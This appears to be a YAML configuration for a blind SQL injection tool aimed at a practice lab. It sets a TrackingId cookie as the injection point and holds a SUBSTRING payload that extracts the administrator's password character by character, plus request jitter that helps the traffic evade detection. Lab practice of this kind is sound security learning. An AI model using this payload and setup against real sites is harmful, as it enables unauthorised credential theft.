target:
  url: "https://LAB-URL-HERE/"

injection:
  type: "cookie"        # cookie / param / header
  name: "TrackingId"    # change per target
  base_value: ""

inference:
  true_string: "Welcome back!"

extraction:
  charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  max_length: 25
  query: "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}"

network:
  timeout: 10
  retries: 2

traffic:
  jitter_min_ms: 100
  jitter_max_ms: 400
